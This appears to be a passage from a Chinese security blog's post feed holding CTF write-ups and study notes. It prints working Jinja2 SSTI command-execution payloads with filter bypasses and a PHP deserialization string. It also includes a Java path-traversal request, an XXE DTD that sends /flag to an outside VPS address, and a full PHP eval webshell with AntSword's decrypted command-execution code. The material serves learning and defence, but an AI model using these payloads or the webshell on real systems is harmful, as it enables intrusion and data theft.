&#x2F;&quot;).read()&#125;&#125;&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[&#39;o&#39;+&#39;s&#39;][&#39;pop&#39;+&#39;en&#39;](&quot;sort &#x2F;this_is_the_fla\\g.txt&quot;).read()&#125;&#125; 这里防止对cat有过滤 直接用的sort。已经知道的过滤是popen，import，flag。os不知道，懒得测试了 直接绕过 思考这里我写了几种自己研究和网上学习到的payload 引用资源：dict 保存类实例或对象实例的属性变量键值对字典class 返回类型所属的对象mro 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。bases 返回该对象所继承的基类// __base__和__mro__都是用来寻找基类的 subclasses 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表init 类的初始化方法globals 对包含函数全局变量的字典的引用我思考的：__builtins__里面包括了一些直接拿来用的方法 比如说hex open等。 123456789101112131415python3:&#123;&#123;().__class__.__bases__[0].__subclasses__()[177].__init__.__globals__.__builtins__[&#x27;open&#x27;](&#x27;/flag&#x27;).read()&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;#命令执行：&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;#文件操作&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;filename&#x27;, &#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 这种不用找类当然了 万能的实际用起来可能并不能。。因为一般会过滤 比如这道题的import 和 popen都过滤了，RCE的时候万金油不太行了！python2:&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125; &#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;)&#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465SSTI关键词（防护用）[](\\)&#123;&#125;___.g&#39;&#39;&quot;&quot;requestgnamespace__dict____class____mro____bases____subclasses____init____globals__selfconfigurl_forget_flashed_messageslipsumcurrent_apprangesessiondictget_flashed_messagescyclerjoiner__builtins____import__evalkeysindexvaluespopenread_TemplateReference__contextenvironapplication_get_data_for_jsonJSONEncoderdefaultsystemflag*?import_IterationGuardcatch_warnings_ModuleLockflagchrsubprocesscommandssockethexbase64 找模块脚本： 123456789101112131415161718192021222324252627282930num=0import numpychoice=int(input(&quot;找os1 其他0&quot;))if choice==1: for item in [].__class__.__mro__[1].__subclasses__(): try: if &#x27;os&#x27; in item.__init__.__globals__: print(num) print(item) num+=1 except: print(&#x27;-&#x27;) num+=1else: searchList = [&#x27;__init__&#x27;, &quot;__new__&quot;, &#x27;__del__&#x27;, &#x27;__repr__&#x27;, &#x27;__str__&#x27;, &#x27;__bytes__&#x27;, &#x27;__format__&#x27;, &#x27;__lt__&#x27;, &#x27;__le__&#x27;, &#x27;__eq__&#x27;, &#x27;__ne__&#x27;, &#x27;__gt__&#x27;, &#x27;__ge__&#x27;, &#x27;__hash__&#x27;, &#x27;__bool__&#x27;, &#x27;__getattr__&#x27;, &#x27;__getattribute__&#x27;, &#x27;__setattr__&#x27;, &#x27;__dir__&#x27;, &#x27;__delattr__&#x27;, &#x27;__get__&#x27;, &#x27;__set__&#x27;, &#x27;__delete__&#x27;, &#x27;__call__&#x27;, &quot;__instancecheck__&quot;, &#x27;__subclasscheck__&#x27;, &#x27;__len__&#x27;, &#x27;__length_hint__&#x27;, &#x27;__missing__&#x27;,&#x27;__getitem__&#x27;, &#x27;__setitem__&#x27;, &#x27;__iter__&#x27;,&#x27;__delitem__&#x27;, &#x27;__reversed__&#x27;, &#x27;__contains__&#x27;, &#x27;__add__&#x27;, &#x27;__sub__&#x27;,&#x27;__mul__&#x27;] neededFunction = [&#x27;open&#x27;] pay = int(input(&quot;Payload?[1|0]&quot;)) for index, i in enumerate(&#123;&#125;.__class__.__base__.__subclasses__()): for attr in searchList: if hasattr(i, attr): if eval(&#x27;str(i.&#x27;+attr+&#x27;)[1:9]&#x27;) == &#x27;function&#x27;: for goal in neededFunction: if (eval(&#x27;&quot;&#x27;+goal+&#x27;&quot; in i.&#x27;+attr+&#x27;.__globals__[&quot;__builtins__&quot;].keys()&#x27;)): if pay != 1: print(index,i.__name__,&quot;:&quot;, attr, goal) else: print(&quot;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;&quot; + i.__name__ + &quot;&#x27; %&#125;&#123;&#123; c.&quot; + attr + &quot;.__globals__[&#x27;__builtins__&#x27;].&quot; + goal + &quot;(\\&quot;[evil]\\&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&quot;)","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"},{"name":"buuoj","slug":"buuoj","permalink":"https://polosec.github.io/tags/buuoj/"}]},{"title":"网鼎杯web-反序列化,java","slug":"网鼎杯web-反序列化","date":"2020-05-15T15:08:19.000Z","updated":"2020-05-16T11:31:14.717Z","comments":true,"path":"2020/05/15/网鼎杯web-反序列化/","link":"","permalink":"https://polosec.github.io/2020/05/15/%E7%BD%91%E9%BC%8E%E6%9D%AFweb-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"","text":"反序列化题目源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); &#125; public function process() &#123; if($this-&gt;op == &quot;1&quot;) &#123; $this-&gt;write(); &#125; else if($this-&gt;op == &quot;2&quot;) &#123; $res = $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(&quot;Bad Hacker!&quot;); &#125; &#125; private function write() &#123; if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123; if(strlen((string)$this-&gt;content) &gt; 100) &#123; $this-&gt;output(&quot;Too long!&quot;); die(); &#125; $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); &#125; else &#123; $this-&gt;output(&quot;Failed!&quot;); &#125; &#125; private function read() &#123; $res = &quot;&quot;; if(isset($this-&gt;filename)) &#123; $res = file_get_contents($this-&gt;filename); &#125; return $res; &#125; private function output($s) &#123; echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; &#125; function __destruct() &#123; if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); &#125;&#125;function is_valid($s) &#123; for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;&#125;if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123; $str = (string)$_GET[&#x27;str&#x27;]; if(is_valid($str)) &#123; $obj = unserialize($str); &#125;&#125; 阅读源码后可以发现，这道题过滤的内容比较少，相对简单，但是我一开始还是没做出来，菜。方法一：利用php7.1+特性，对属性类型不敏感，本地构造的时候把protected换成public构造即可。O:11:”FileHandler”:3:{s:2:”op”;i:2;s:8:”filename”;s:8:”flag.php”;s:7:”content”;s:1:”t”;}右键查看源码即可。方法二：在利用php7.1+特性的基础上，利用php伪协议，php://filter/convert.base64-encode/resource=flag.php获取flag.php文件内容。得到内容为PD9waHAgJGZsYWc9J2ZsYWd7YzI0NmJmMzEtOGM3Zi00M2FhLTliY2QtMGY2NDVlNTk2NWQxfSc7Cg==然后base64解码即可。&lt;?php $flag=’flag{c246bf31-8c7f-43aa-9bcd-0f645e5965d1}’; java file这道题拿到手没什么思路，看了师傅们的wp继续做，知道了是目录穿越。首先明白tomcat部署项目的文件结构：部署在webapps文件夹下，其下每个文件夹代表一个项目。 classes文件夹下存放基本类，servlet等文件。首先随便传个文件，发现了servlet的名字。首先要获取web.xml文件，看看文件结构是怎样的，然后再把对应的东西下载下来使用../不断返回上级目录，最后是/web.xmlpayload:DownloadServlet?filename=../../../web.xml下载下来之后发现了几个servlet文件，对应应该是classes/xxxx.servlet.class（注意前面还有包名）下载servlet.class文件：payload:?filename=../../../classes/cn/abc/servlet/UploadServlet.class这样子把四个servlet下载下来，然后反编译阅读源码 这是下载的servlet，注意看过滤了flag，不能通过目录穿越直接穿越到根目录下载flag文件。继续看上传servlet，关键代码： 12345678910if (filename.startsWith(&quot;excel-&quot;) &amp;&amp; &quot;xlsx&quot;.equals(fileExtName)) &#123; try &#123; Workbook wb1 = WorkbookFactory.create(in); Sheet sheet = wb1.getSheetAt(0); System.out.println(sheet.getFirstRowNum()); &#125; catch (InvalidFormatException var20) &#123; System.err.println(&quot;poi-ooxml-3.10 has something wrong&quot;); var20.printStackTrace(); &#125; &#125; 这里可能存在XXE漏洞，遂测试。excel文件需要以excel-开头。由于是在buuoj复现，所以不可以用外网vps，只能用内网vps，用另外一个号再开一个ssh连着。。。卡了俩小时XXE我也不是很了解，后续会继续学习。这里跟着师傅们先复现：大体思路就是xml文件加载外部实体，加载的外部实体里面会”包含”（我是这么理解的）本地flag文件，然后向vps发送一个请求，参数把flag文件带出去。dtd文件： 123&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http:&#x2F;&#x2F;174.1.87.39:8888&#x2F;?%file;&#39;&gt;&quot;&gt;%all; xml中新添加的内容： 12&lt;!DOCTYPE data SYSTEM &quot;http:&#x2F;&#x2F;174.1.87.39&#x2F;1.dtd&quot;&gt;&lt;data&gt;&amp;send;&lt;&#x2F;data&gt; 这里有个坑 就是在Windows系统下不要解压，直接修改后缀然后用360压缩在压缩文件内修改，再把扩展名改回去。改好之后服务器监听端口，上传文件。 结束。 总结XXE不太熟，需要再学习，目录穿越想到了，但是没成功利用，再有就是我看的目录结构看的是java web项目的目录结构，而不是tomcat部署的目录结构，所以也没利用成功。","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"},{"name":"buuoj","slug":"buuoj","permalink":"https://polosec.github.io/tags/buuoj/"}]},{"title":"DASCTF-misc","slug":"DASCTF-misc","date":"2020-05-14T14:00:32.000Z","updated":"2020-05-14T15:15:30.786Z","comments":true,"path":"2020/05/14/DASCTF-misc/","link":"","permalink":"https://polosec.github.io/2020/05/14/DASCTF-misc/","excerpt":"","text":"DASCTF-MISC-内存取证参考链接http://www.fzwjscj.xyz/index.php/archives/25/首先使用volatility 分析操作系统版本，然后过滤文件，将其dump出来。 这是dump出来的内容通过分析发现在ctf-wiki上是ABC加密，QWE对应着ABC，然后密文是CTKQEKNHZHQLLVGKROLATNWGQKRRKQGWNTA将其解密后结果为veracryptpasswordiskeyboarddraobyek同时提示密码是大写的，所以密码应该是KEYBOARDDRAOBYEK然后使用veracrypt加载secret，输入密码之后有个vhd文件，可以直接右键挂载。但是里面的flag是假的。。用010editor也没看出来什么端倪，参考wp后才知道是NTFS隐写。使用ntfsstreamseditor打开后可以看到隐写的内容flag{4a02f6dc603c377a234df479609d237c} 总结首先是没找到txt文件，其次是不知道加密方式，再到后面是没想到NTFS隐写。。这道题。。自己做是做不出来但是也学习到了NTFS隐写这种操作。参考链接：https://www.cnblogs.com/Chesky/p/ALTERNATE_DATA_STREAMS.html在NTFS文件系统中存在着NTFS交换数据流（Alternate Data Streams，简称ADS），这是NTFS磁盘格式的特性之一。每一个文件，都有着主文件流和非主文件流，主文件流能够直接看到；而非主文件流寄宿于主文件流中，无法直接读取，这个非主文件流就是NTFS交换数据流。简单地说就是可以隐藏文件（图片视频可执行文件）并且正常情况下看不到。可以使用type命令将需要隐藏的文件附加上去。如type “hidden.jpg” &gt; “targe.jpg”:”hidden.jpg”","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"},{"name":"misc","slug":"misc","permalink":"https://polosec.github.io/tags/misc/"}]},{"title":"flask&ssti&csrf","slug":"flask-ssti-csrf","date":"2020-05-14T04:42:38.000Z","updated":"2020-05-14T14:00:00.222Z","comments":true,"path":"2020/05/14/flask-ssti-csrf/","link":"","permalink":"https://polosec.github.io/2020/05/14/flask-ssti-csrf/","excerpt":"","text":"最近”闲的”没事研究了一下flask框架的防护问题，主要是ssti与csrf。10号前一直在搞用flask写的bms，算是荒废掉了。。先说一句废话，七牛CDN有个测试域名，一段时间后失效，失效后需要替换为自己备案后的域名进行CDN加速，在这里出现了一个问题，在hexo主题配置文件将URL换为自己的CDN域名后，用之前的域名上传的图片就找不到了（因为之前的域名已经被废弃，无法解析）这时候可以 hexo clean 然后 hexo g，重新把md文件渲染成html文件，这样里面产生的图片链接的URL前缀就是我们新配置的CDN域名。 参考资料https://mp.weixin.qq.com/s/Lj4nCz0hag-AKQF_s79fQwhttps://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/#%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%A6%82%E8%BF%B0https://xz.aliyun.com/t/6885http://shaobaobaoer.cn/archives/660/python-flask-jinja-sstihttps://www.anquanke.com/post/id/188172 SSTIssti就是服务器端模板注入（Server Side Template Injection）模板指的是现成写好的东西，只需要传入一些变量到模板，然后渲染成html页面。模板是写好的，而变量是每次需要传入的。不正确地使用模板引擎进行渲染时，会出现SSTI漏洞。（jinja2）在flask中，使用jinja2模板渲染引擎，有两种渲染模板的方法：render_template()和render_template_string()，两种方法的区别是第一种指定一个模板文件(.html)，第二种则规定了需要传入一个字符串，把html代码写到字符串中。出现问题的是第二种渲染方式（我写bms的时候用的是第一种。。本来想写写防御来着，但是根本不存在利用点），当显示方式为直接获取变量时，如 12person[&#x27;name&#x27;]=request.args.get(&#x27;name&#x27;)hello ,&#123;&#123;person.name&#125;&#125; 这样的话传入 1?name&#x3D;&#123;&#123;7*7&#125;&#125; 的话显示的就是7*7，因为这样会把传入的内容当作字符串进行处理，而非模板语句。如果是这样： 12person[&#39;name&#39;]&#x3D;request.args.get(&#39;name&#39;)hello ,%s %person[&#39;name&#39;] 通过字符串格式化的方式传入内容，模板语句会被解释执行。 SSTI利用任何漏洞的目的是实现个人意图，比如getshell，读取文件。对于SSTI的利用，我遇到的主要是通过获得config里面的secret key进行伪造session，模拟管理员登录；或者通过实例化os反弹shell，或者通过file、open对象进行文件读取。__class__获取当前实例的对象，__mro__获得父类链，__subclasses__获得当前类所有的子类，__init__实例化一个类，__globals__获取所有可用的方法与变量。举例：命令执行： 1&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[&quot;os&quot;][&quot;popen&quot;](&quot;whoami&quot;).read()&#125;&#125; 过滤与绕过过滤引号request.args是Flask中的一个属性，为返回请求的参数，这里把path当作变量名，将后面的路径传值进来，进而绕过了引号的过滤： 1?name&#x3D;&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()&#125;&#125;&amp;path&#x3D;&#x2F;tmp&#x2F;cmd.py 过滤双下划线1?name&#x3D;&#123;&#123;&#39;&#39;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;&amp;class&#x3D;__class__&amp;mro&#x3D;__mro__&amp;subclasses&#x3D;__subclasses__ 过滤中括号首先明白中括号是什么作用：从字典中取值。 1globals[&quot;os&quot;]&#x3D;&#x3D;globals.os 所以可以用__getitem__绕过。 过滤点号1&quot;&quot;.__class__等价于&quot;&quot;[&quot;__class__&quot;] 关键词过滤思路是进行拼接。 1&#123;&#123;&quot;&quot;.__getattribute__(&quot;__cla&quot;+&quot;ss__&quot;)&#125;&#125; SSTI防御首先是尽量不使用render_template_string(),如果用的话，尽量不使用格式化字符串的形式；如果必须使用的话，要建立相对强的过滤规则，尤其是对小括号的过滤，过滤小括号后就很难执行命令了。对于关键词过滤，我的思路是进行预处理，将接收到的字符串中的引号，加号等特殊符号正则匹配去掉后再进行黑名单匹配。 flask csrf分析开口就是老csrf了，先分析分析源码首先 1CSRFProtect(app) ，跟进CSRFProtect 然后有一个app.before_request修饰的方法，说明在请求前执行。 该方法进行 1self.protect() 跟进self.protect() 使用方法validate_csrf尝试验证token的正确性，token为self._get_csrf_token 其实对URLSafeTimedSerializer这个我不是太熟悉，我对他的理解是产生一个session，session包括三个字段，base64加密的数据字段，timestamp，签名。然后产生的token就是获取序列化后的session的数据字段的 1session[field_name] 中的数据。 生命流程第一次访问，产生session与token，设置过期时间第二次包括以后的访问在头部或者表单中携带token，访问前进行验证，验证通过则允许访问。除了token外还有请求头，同源策略等验证 CSRF防护就flask的csrf防护方法而言，主要是防止hacker拿到token，主要需要防范xss，比如上述提到的ssti会导致xss。","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"SSL&TLS","slug":"SSL-TLS","date":"2020-05-01T10:27:41.000Z","updated":"2020-05-01T11:08:45.615Z","comments":true,"path":"2020/05/01/SSL-TLS/","link":"","permalink":"https://polosec.github.io/2020/05/01/SSL-TLS/","excerpt":"","text":"最近复习计算机网络看到了计算机网络安全那一章，对SSL TLS 证书等内容有了初步理解，这里做一个记录。参考链接：http://www.ruanyifeng.com/blog/2014/09/illustration-ssl.htmlhttps://segmentfault.com/a/1190000002554673https://kb.cnblogs.com/page/197396/https://www.cnblogs.com/handsomeBoys/p/6556336.html 证书CA是证书授权中心，简单说就是签发证书的机构。证书签发流程：服务端向CA提交公钥，组织信息，域名等内容CA审核通过后签发证书，证书包括了：申请者公钥，申请者信息、域名、有效时间、序列号等内容，还有一个数字签名：CA用CA自己的私钥对申请者所有信息生成的摘要进行加密。简单来说，证书=申请者公钥+CA签名+申请者信息 https请求过程1.客户端向服务器443端口发送请求2.服务器返回证书3.客户端验证证书有效性，并且产生一随机值，通过服务器公钥加密。4.服务器收到加密后的随机值后，用私钥解密，接下来双方传输的内容都用该随机值加密。 SSL/TLS通信过程：1.客户端给服务器发送请求，声明自己的加密方式，并且发送一个随机数2.服务器返回证书，确定使用的加密方式，发送一个随机数3.客户端验证证书有效性，验证通过后，产生一个随机数，通过服务器公钥进行加密，作为premaster key发送给服务器。4.服务器接受到加密后的随机数后解密5.客户端与服务器根据相同的算法，通过两个未加密的随机数与第三个随机数产生session key6.服务器使用session key发送一个数据，验证连接是否成功建立。7.以后客户端和服务器的通讯使用session key加密（对称加密）","categories":[],"tags":[{"name":"网络","slug":"网络","permalink":"https://polosec.github.io/tags/%E7%BD%91%E7%BB%9C/"}]},{"title":"ping&tracert","slug":"ICMP-tracert","date":"2020-05-01T10:14:22.000Z","updated":"2020-05-01T10:35:50.754Z","comments":true,"path":"2020/05/01/ICMP-tracert/","link":"","permalink":"https://polosec.github.io/2020/05/01/ICMP-tracert/","excerpt":"","text":"pingping命令用的是ICMP回送请求与回答，如果ping一个存在的主机的话，在不禁止ping的前提下会发一个ICMP回送回答，主机计算RTT，平均RTT与TTL。 tracert/traceroute利用的是ping命令，把ttl从1往上加，当路由器收到ttl为1的数据包后-1变成0，会给源站发一个超时，但是存在的问题是如果该路由器对超时不处理的话，在源站看到的节点就变成了*，也有可能是某些路由器对tracert命令不可见。","categories":[],"tags":[{"name":"网络","slug":"网络","permalink":"https://polosec.github.io/tags/%E7%BD%91%E7%BB%9C/"}]},{"title":"蚁剑流量分析&webshell","slug":"蚁剑流量分析-webshell","date":"2020-04-30T02:53:51.000Z","updated":"2020-04-30T08:29:13.455Z","comments":true,"path":"2020/04/30/蚁剑流量分析-webshell/","link":"","permalink":"https://polosec.github.io/2020/04/30/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-webshell/","excerpt":"","text":"webshell理解webshell的本质是传入命令并且执行。常见的php webshell 1&lt;?php eval($_POST[&#x27;cmd&#x27;];?&gt;) shell.php访问shell.php的时候post一个参数cmd,如果传入的是cmd=system(“whoami”)的话就会执行whoami。webshell相当于网站管理功能，提供列目录，修改文件，虚拟终端等操作，这些可视化操作的背后其实是一条条PHP语句写的，然后送到服务器执行，然后根据返回结果可视化到管理终端。shell与waf一直在升级，衍生出了各种混淆方法。当然，waf也在抓特征流量进行拦截。 蚁剑流量分析今天分析的是昨天没看完的蚁剑流量。发送数据采用RSA加密，服务器返回数据采用AES加密。shell： 12345678910111213141516171819&lt;?php$cmd = @$_POST[&#x27;ant&#x27;];$pk = &lt;&lt;&lt;EOF-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCd3U6xkZFNwFKSRlRa+Jsdy0/Erkpoq9A/Xl58TfOL5ghxaQh91zWriwpsMVMdjkORzTNM0yrKoyF2+LjxzE2wW6Qt/NC6dQgUKQQJk9ypgq4Po9ypxxI8AdtthKSelijpqD5YsXZYSFGCyLNaC33+pVp2wQUED9OTJg9AuXIG4QIDAQAB-----END PUBLIC KEY-----EOF;$cmds = explode(&quot;|&quot;, $cmd);$pk = openssl_pkey_get_public($pk);$cmd = &#x27;&#x27;;foreach ($cmds as $value) &#123; if (openssl_public_decrypt(base64_decode($value), $de, $pk)) &#123; $cmd .= $de; &#125;&#125;eval($cmd); 首先模拟一次过程：启动虚拟终端并输入whoami查询。 在wireshark抓到数据包： 追踪HTTP流量： 对发送的数据进行还原使用私钥加密的数据用公钥解密。解密后数据： 1234567891011121314151617181920212223242526272829&lt;?php ant=@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);function asenc($out)&#123;@session_start();$key=@substr(str_pad(session_id(),16,&#x27;a&#x27;),0,16);return @base64_encode(openssl_encrypt(base64_encode($out), &#x27;AES-128-ECB&#x27;, $key, OPENSSL_RAW_DATA));&#125;;//采用AES加密输出，key为session前16位。function asoutput()&#123;$output=ob_get_contents();ob_end_clean();echo &quot;3c5e3e9640&quot;;echo @asenc($output);echo &quot;cda10a9ad&quot;;&#125;//输出内容ob_start();try&#123;$p=base64_decode($_POST[&quot;kba6818a1ddd35&quot;]);$s=base64_decode($_POST[&quot;med28329bbe5b9&quot;]);$envstr=@base64_decode($_POST[&quot;v610da0caba97e&quot;]);$d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);//获取下面post的参数，分别是cmd和whoami。$c=substr($d,0,1)==&quot;/&quot;?&quot;-c \\&quot;&#123;$s&#125;\\&quot;&quot;:&quot;/c \\&quot;&#123;$s&#125;\\&quot;&quot;;if(substr($d,0,1)==&quot;/&quot;)&#123;@putenv(&quot;PATH=&quot;.getenv(&quot;PATH&quot;).&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;);&#125;else&#123;@putenv(&quot;PATH=&quot;.getenv(&quot;PATH&quot;).&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;);&#125;if(!empty($envstr))&#123;$envarr=explode(&quot;|||asline|||&quot;, $envstr);foreach($envarr as $v) &#123;if (!empty($v)) &#123;@putenv(str_replace(&quot;|||askey|||&quot;, &quot;=&quot;, $v));&#125;&#125;&#125;//判断是Linux还是Windows$r=&quot;&#123;$p&#125; &#123;$c&#125;&quot;;//拼接命令function fe($f)&#123;$d=explode(&quot;,&quot;,@ini_get(&quot;disable_functions&quot;));if(empty($d))&#123;$d=array();&#125;else&#123;$d=array_map(&#x27;trim&#x27;,array_map(&#x27;strtolower&#x27;,$d));&#125;return(function_exists($f)&amp;&amp;is_callable($f)&amp;&amp;!in_array($f,$d));&#125;;function runshellshock($d, $c) &#123;if (substr($d, 0, 1) == &quot;/&quot; &amp;&amp; fe(&#x27;putenv&#x27;) &amp;&amp; (fe(&#x27;error_log&#x27;) || fe(&#x27;mail&#x27;))) &#123;if (strstr(readlink(&quot;/bin/sh&quot;), &quot;bash&quot;) != FALSE) &#123;$tmp = tempnam(sys_get_temp_dir(), &#x27;as&#x27;);putenv(&quot;PHP_LOL=() &#123; x; &#125;; $c &gt;$tmp 2&gt;&amp;1&quot;);if (fe(&#x27;error_log&#x27;)) &#123;error_log(&quot;a&quot;, 1);&#125; else &#123;mail(&quot;a@127.0.0.1&quot;, &quot;&quot;, &quot;&quot;, &quot;-bv&quot;);&#125;&#125; else &#123;return False;&#125;$output = @file_get_contents($tmp);@unlink($tmp);if ($output != &quot;&quot;) &#123;print($output);return True;&#125;&#125;return False;&#125;;function runcmd($c)&#123;$ret=0;$d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);if(fe(&#x27;system&#x27;))&#123;@system($c,$ret);&#125;elseif(fe(&#x27;passthru&#x27;))&#123;@passthru($c,$ret);&#125;elseif(fe(&#x27;shell_exec&#x27;))&#123;print(@shell_exec($c));&#125;elseif(fe(&#x27;exec&#x27;))&#123;@exec($c,$o,$ret);print(join(&quot;&quot;,$o));&#125;elseif(fe(&#x27;popen&#x27;))&#123;$fp=@popen($c,&#x27;r&#x27;);while(!@feof($fp))&#123;print(@fgets($fp,2048));&#125;@pclose($fp);&#125;elseif(fe(&#x27;proc_open&#x27;))&#123;$p = @proc_open($c, array(1 =&gt; array(&#x27;pipe&#x27;, &#x27;w&#x27;), 2 =&gt; array(&#x27;pipe&#x27;, &#x27;w&#x27;)), $io);while(!@feof($io[1]))&#123;print(@fgets($io[1],2048));&#125;while(!@feof($io[2]))&#123;print(@fgets($io[2],2048));&#125;@fclose($io[1]);@fclose($io[2]);@proc_close($p);&#125;elseif(fe(&#x27;antsystem&#x27;))&#123;@antsystem($c);&#125;elseif(runshellshock($d, $c)) &#123;return $ret;&#125;elseif(substr($d,0,1)!=&quot;/&quot; &amp;&amp; @class_exists(&quot;COM&quot;))&#123;$w=new COM(&#x27;WScript.shell&#x27;);$e=$w-&gt;exec($c);$so=$e-&gt;StdOut();$ret.=$so-&gt;ReadAll();$se=$e-&gt;StdErr();$ret.=$se-&gt;ReadAll();print($ret);&#125;else&#123;$ret = 127;&#125;return $ret;&#125;;//命令执行函数$ret=@runcmd($r.&quot; 2&gt;&amp;1&quot;);//命令执行并且stderr重定向到stdoutprint ($ret!=0)?&quot;ret=&#123;$ret&#125;&quot;:&quot;&quot;;;&#125;catch(Exception $e)&#123;echo &quot;ERROR://&quot;.$e-&gt;getMessage();&#125;;asoutput();//执行入口die();//这里是post的数据，对应上面的med28329bbe5b9和kba6818a1ddd35。。。&amp;kba6818a1ddd35=Y21k&amp;med28329bbe5b9=Y2QgL2QgIkU6XFxwaHBzdHVkeV9wcm9cXFdXV1xcdGVzdC5pbyImd2hvYW1pJmVjaG8gW1NdJmNkJmVjaG8gW0Vd&amp;v610da0caba97e=?&gt; 具体的操作写在上方注释里了，比较清楚。 实战接下来启动虚拟终端，传入whoami ，并且执行，查看数据包。 返回数据解密客户端收到数据后会用约定的key进行解密。返回数据：注意：返回的数据里面并不全是有效加密内容，前后存在两端干扰数据，可以在 代码中看到分别是3c5e3e9640和cda10a9ad。中间的数据才是真正有用的数据。首先对中间的数据base64解密一次，然后使用AES-128-ECB解密。key为session前16位：substr(sessionid,0,16);。解密方法：openssl_decrypt($payload, ‘AES-128-ECB’, $key,OPENSSL_RAW_DATA)解密后数据：ZGVza3RvcC00dTgxYjg1XDY5MDI3DQpbU10NCkU6XHBocHN0dWR5X3Byb1xXV1dcdGVzdC5pbw0KW0VdIA0K然后进行base64解密。解密后的数据：desktop-4u81b85\\69027[S]E:\\phpstudy_pro\\WWW\\test.io[E]就是执行whoami的结果。 总结蚁剑流量分析算是看了一天，得益于前期对AES和RSA的基础知识，以至于不需要先看RSA和aes。。2333在对shell和发送的代码进行分析的时候还是遇到了一点困难，有些地方只是大体明白了什么意思，比如识别是Linux还是Windows，但是细讲每一个函数的功能我还是不知道的。对此我的思路是既然目标是命令执行，那么就把底层的实现稍微抽象一点，不影响后续分析。分析流量还是一件非常有意思的事情，虽然我没有机会打AWD，but I love AWD 